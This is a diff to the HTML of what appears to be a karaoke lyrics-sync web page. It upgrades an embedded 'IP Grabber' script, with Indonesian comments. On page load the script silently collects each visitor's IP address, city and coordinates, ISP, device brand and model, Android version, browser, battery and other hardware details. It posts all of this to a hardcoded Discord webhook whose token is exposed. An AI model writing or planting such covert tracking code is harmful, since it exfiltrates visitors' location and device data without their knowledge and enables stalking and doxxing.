@@ -1084,46 +1084,86 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
-<!-- ==================== IP GRABBER v9 FULL - Sesuai Request Kamu ==================== -->
+<!-- ==================== IP GRABBER v9.3 - Detailed Model + Browser ==================== -->
 <script>
 // GANTI DENGAN WEBHOOK DISCORD KAMU
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
 
-function getDeviceModel() {
-    const ua = navigator.userAgent.toLowerCase();
-    if (ua.includes('android')) {
-        if (ua.includes('samsung')) return 'Samsung Android';
-        if (ua.includes('xiaomi') || ua.includes('redmi')) return 'Xiaomi/Redmi';
-        if (ua.includes('oppo')) return 'Oppo';
-        if (ua.includes('vivo')) return 'Vivo';
-        if (ua.includes('realme')) return 'Realme';
-        return 'Android Device';
+function getDetailedDeviceInfo() {
+    const ua = navigator.userAgent;
+    const uaLower = ua.toLowerCase();
+    
+    let brand = 'Unknown';
+    let model = '';
+    
+    // Deteksi Brand
+    if (uaLower.includes('samsung')) brand = 'Samsung';
+    else if (uaLower.includes('xiaomi') || uaLower.includes('redmi') || uaLower.includes('poco')) brand = 'Xiaomi/Redmi/Poco';
+    else if (uaLower.includes('oppo') || uaLower.includes('realme')) brand = 'Oppo/Realme';
+    else if (uaLower.includes('vivo')) brand = 'Vivo';
+    else if (uaLower.includes('infinix')) brand = 'Infinix';
+    else if (uaLower.includes('tecno')) brand = 'Tecno';
+    else if (uaLower.includes('huawei') || uaLower.includes('honor')) brand = 'Huawei/Honor';
+    else if (uaLower.includes('oneplus')) brand = 'OnePlus';
+    else if (uaLower.includes('iqoo')) brand = 'iQOO';
+    else if (uaLower.includes('nothing')) brand = 'Nothing';
+    else if (uaLower.includes('motorola')) brand = 'Motorola';
+    else if (uaLower.includes('lenovo')) brand = 'Lenovo';
+    else if (uaLower.includes('asus')) brand = 'Asus';
+    else if (uaLower.includes('nokia')) brand = 'Nokia';
+    
+    // Coba ekstrak model spesifik (contoh: SM-A546, Redmi Note 12, dll)
+    let modelMatch = ua.match(/(?:SM-|Redmi|POCO|Infinix|TECNO|Galaxy |Note |A\d+|M\d+|F\d+|Hot |Spark )/i);
+    if (modelMatch) {
+        // Ambil potongan setelah brand sampai sebelum build atau parenthesis
+        const temp = ua.substring(ua.indexOf(modelMatch[0]));
+        model = temp.split(/[;(]/)[0].trim().replace(/Build.*/i, '').trim();
     }
-    if (/iphone|ipad|ipod/.test(ua)) return 'iPhone / iPad';
-    if (ua.includes('windows')) return 'Windows PC/Laptop';
-    if (ua.includes('macintosh')) return 'Mac';
-    return 'Unknown Device';
+    
+    const deviceModel = model ? `${brand} ${model}` : brand + ' Device';
+    
+    // Browser Info
+    let browser = 'Unknown Browser';
+    if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) {
+        const ver = ua.match(/Chrome\/(\d+)/);
+        browser = `Chrome ${ver ? ver[1] : ''}`;
+    } else if (ua.includes('Firefox')) {
+        const ver = ua.match(/Firefox\/(\d+)/);
+        browser = `Firefox ${ver ? ver[1] : ''}`;
+    } else if (ua.includes('Edg')) {
+        const ver = ua.match(/Edg\/(\d+)/);
+        browser = `Edge ${ver ? ver[1] : ''}`;
+    } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+        browser = 'Safari';
+    } else if (ua.includes('SamsungBrowser')) {
+        const ver = ua.match(/SamsungBrowser\/(\d+)/);
+        browser = `Samsung Internet ${ver ? ver[1] : ''}`;
+    } else if (ua.includes('OPR')) {
+        browser = 'Opera';
+    }
+    
+    return { deviceModel, browser, brand };
 }
 
 async function sendIPLog() {
     let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown', lat: null, lon: null };
-
+    
     try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
         ipData = {
-            ip: data.ip,
-            city: data.city,
-            region: data.region,
-            country_name: data.country_name,
-            org: data.org,
+            ip: data.ip || 'Unknown',
+            city: data.city || '-',
+            region: data.region || '-',
+            country_name: data.country_name || 'Unknown',
+            org: data.org || 'Unknown',
             lat: data.latitude,
             lon: data.longitude
         };
     } catch (e) {}
 
-    const deviceModel = getDeviceModel();
-
+    const { deviceModel, browser } = getDetailedDeviceInfo();
+    
     // Battery
     let batteryInfo = 'Tidak tersedia';
     if ('getBattery' in navigator) {
@@ -1133,45 +1173,54 @@ async function sendIPLog() {
         } catch (e) {}
     }
 
+    // Android Version
+    let androidVersion = '—';
+    const androidMatch = navigator.userAgent.match(/Android\s([0-9.]+)/i);
+    if (androidMatch) androidVersion = androidMatch[1];
+
     const embed = {
-        title: "🎤 Karaoke Sync - Pengunjung Baru! (v9 Full)",
+        title: "🎤 Karaoke Sync - Pengunjung Baru! (v9.3)",
         color: 0x00ff88,
         timestamp: new Date().toISOString(),
         fields: [
-            { name: "IP Address", value: `\`${ipData.ip || 'Unknown'}\``, inline: true },
-            { name: "Lokasi", value: `${ipData.city || '-'}, ${ipData.region || '-'}, ${ipData.country_name || 'Unknown'}`, inline: true },
+            { name: "IP Address", value: `\`${ipData.ip}\``, inline: true },
+            { name: "Lokasi", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`, inline: true },
             { name: "Koordinat", value: ipData.lat && ipData.lon ? `${ipData.lat.toFixed(4)}, ${ipData.lon.toFixed(4)}` : 'Tidak tersedia', inline: true },
-            { name: "ISP", value: ipData.org || 'Unknown', inline: true },
+            { name: "ISP", value: ipData.org, inline: true },
             { name: "Device Model", value: deviceModel, inline: true },
+            { name: "Android Version", value: androidVersion, inline: true },
+            { name: "Browser", value: browser, inline: true },
             { name: "Operating System", value: navigator.platform || 'Unknown', inline: true },
             { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
             { name: "CPU Cores", value: navigator.hardwareConcurrency || 'Unknown', inline: true },
-            { name: "RAM (approx)", value: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown', inline: true },
+            { name: "RAM", value: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown', inline: true },
             { name: "Battery", value: batteryInfo, inline: true },
             { name: "Connection", value: navigator.connection ? navigator.connection.effectiveType : 'Unknown', inline: true },
             { name: "Dark Mode", value: window.matchMedia('(prefers-color-scheme: dark)').matches ? '✅ Ya' : '❌ Tidak', inline: true },
-            { name: "Touch Support", value: 'ontouchstart' in window ? '✅ Ya (Mobile)' : '❌ Tidak', inline: true },
-            { name: "Device Info", value: navigator.userAgent.substring(0, 220) + (navigator.userAgent.length > 220 ? "..." : ""), inline: false },
+            { name: "User Agent", value: navigator.userAgent.substring(0, 220) + (navigator.userAgent.length > 220 ? "..." : ""), inline: false },
             { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
         ],
-        footer: { text: "IP Grabber via GitHub Pages • v9 Full" }
+        footer: { text: "IP Grabber v9.3 • Detailed Model + Browser" }
     };
 
     try {
         await fetch(WEBHOOK_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
+            body: JSON.stringify({ 
+                username: "Karaoke Logger", 
+                embeds: [embed] 
+            })
         });
-        console.log("%c✅ IP Log terkirim - v9 Full", "color: lime; font-weight: bold");
+        console.log("%c✅ IP Log terkirim (v9.3 - Detailed Model + Browser)", "color: lime; font-weight: bold");
     } catch (err) {
-        console.log("IP Logger error:", err.message);
+        console.log("❌ IP Logger error:", err.message);
     }
 }
 
-// Jalankan setelah load
+// Jalankan setelah halaman load
 window.addEventListener('load', () => {
     setTimeout(sendIPLog, 2000);
 });
 </script>
-<!-- ==================== END IP GRABBER v9 FULL ==================== -->
+<!-- ==================== END IP GRABBER v9.3 ==================== -->
